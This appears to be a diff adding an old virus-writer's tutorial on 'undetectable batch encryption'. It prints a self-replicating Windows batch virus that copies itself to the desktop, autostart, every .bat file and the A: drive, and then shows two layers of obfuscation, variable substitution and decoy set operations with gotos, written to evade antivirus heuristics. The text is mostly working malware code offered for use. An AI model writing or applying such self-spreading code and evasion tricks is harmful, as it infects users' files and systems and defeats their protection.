@@ -1,0 +1,208 @@
+			Undetectable batch encryption
+
+I try to show you a very good encryption for batch.
+I don't know, how any AV-program will detect such a virus.
+
+First we need the uncrypted virus code:
+______________________________________
+cls
+@echo off
+copy %0 %windir%\desktop\*.bat
+copy %0 %windir%\startm~1\progra~1\auotst~1\WSt.bat
+for %%v in (*.bat) do copy %0 %%v
+copy %0 A:\
+cls
+______________________________________
+
+
+It's a totaly silly virus, and KAV detect it whit heuristic.
+The virus copies itself to the desktop, to the german autostart and to all *.bat files in the current direction.
+
+
+Now try to crypt the code:
+______________________________________
+set aa=e
+set ab=c
+set ac=h
+set ad=o
+set ae=f
+set af=t
+set ag=y
+set ah=n
+set ai=u
+set aj=l
+set ak=p
+set al=s
+set am=%0
+set an=\
+set ao=d
+set ap=k
+set aq=a
+set ar=r
+set at=m
+set au=g
+set av=i
+%ab%%aj%%al%
+@%aa%%ab%%ac%%ad% %ad%%af%%af%
+%ab%%ad%%ak%%ag% %am% %windir%%an%%ao%%aa%%al%%ap%%af%%ad%%ap%%an%*.bat
+%ab%%ad%%ak%%ag% %am% %windir%%an%%al%%at%%aq%%ar%%af%%at%~1%an%%ak%%ar%%ad%%au%%ar%%aq%~1%an%WST.bat
+%ae%%ad%%ar% %%v %av%%ah% (*.bat) %ao%%ad% %ab%%ad%%ak%%ag% %am% %%v
+%ab%%ad%%ak%%ag% %am% A:%an%
+%ab%%aj%%al%
+______________________________________
+
+
+OK, I think, you wouldn't know, what the code does.
+But, KAV is able to include every SET-OP to the lines. What is to do???
+You have to write a "fake set op", so KAV don't know, what to include
+Look:
+______________________________________
+set aa=fg
+set aa=e         ; this is the true set
+goto aa
+set aa=gf
+:aa
+
+set ab=gfd
+set ab=c         ; this is the true set
+goto ab
+set ab=gf
+:ab
+
+set ac=we
+set ac=h         ; this is the true set
+goto ac
+set ac=gf
+:ac
+
+set ad=ds
+set ad=o         ; this is the true set
+goto ad
+set ad=gf
+:ad
+
+set ae=j
+set ae=f         ; this is the true set
+goto ae
+set ae=gf
+:ae
+
+set af=h
+set af=t         ; this is the true set
+goto af
+set af=gf
+:af
+
+set ag=g
+set ag=y         ; this is the true set
+goto ag
+set ag=gf
+:ag
+
+set ah=f
+set ah=n         ; this is the true set
+goto ah
+set ah=gf
+:ah
+
+set ai=ds
+set ai=u         ; this is the true set
+goto ai
+set ai=gf
+:ai
+
+set aj=ds
+set aj=l         ; this is the true set
+goto aj
+set aj=gf
+:aj
+
+set ak=c
+set ak=p         ; this is the true set
+goto ak
+set ak=gf
+:ak
+
+set al=v
+set al=s         ; this is the true set
+goto al
+set al=gf
+:al
+
+set am=b
+set am=%0         ; this is the true set
+goto am
+set am=gf
+:am
+
+set an=n
+set an=\         ; this is the true set
+goto am
+set am=gf
+:am
+
+set ao=dr
+set ao=d         ; this is the true set
+goto ao
+set ao=gf
+:ao
+
+set ap=g
+set ap=k         ; this is the true set
+goto ap
+set ap=gf
+:ap
+
+set aq=e
+set aq=a         ; this is the true set
+goto aq
+set aq=gf
+:aq
+
+set ar=s
+set ar=r         ; this is the true set
+goto ar
+set ar=gf
+:ar
+
+set at=h
+set at=m         ; this is the true set
+goto at
+set at=gf
+:at
+
+set au=s
+set au=g         ; this is the true set
+goto au
+set au=gf
+:au
+
+set av=f
+set av=i         ; this is the true set
+goto av
+set av=gf
+:av
+%ab%%aj%%al%
+@%aa%%ab%%ac%%ad% %ad%%af%%af%
+%ab%%ad%%ak%%ag% %am% %windir%%an%%ao%%aa%%al%%ap%%af%%ad%%ap%%an%*.bat
+%ab%%ad%%ak%%ag% %am% %windir%%an%%al%%at%%aq%%ar%%af%%at%~1%an%%ak%%ar%%ad%%au%%ar%%aq%~1%an%WST.bat
+%ae%%ad%%ar% %%v %av%%ah% (*.bat) %ao%%ad% %ab%%ad%%ak%%ag% %am% %%v
+%ab%%ad%%ak%%ag% %am% A:%an%
+%ab%%aj%%al%
+_____________________________________
+
+Perhabs you'll ask, what's that?
+Infront of every set-op, I wrote an other false set op.
+And after every set-op, I wrote a goto and a mark, and even a false set-op!
+So include a set isn't possible.
+
+I >think< the only way to detect such a virus is EMULATON.
+But nowadays, no AV program has emulation :-)
+If you have questions or suggestions, fell free and mail me.
+
+
+- - - - - - - - - - - - - - - - - - - 
+SeCoNd PaRt To HeLl
+spth@jet2web.cc
+www.spth.de.vu
+- - - - - - - - - - - - - - - - - - - 
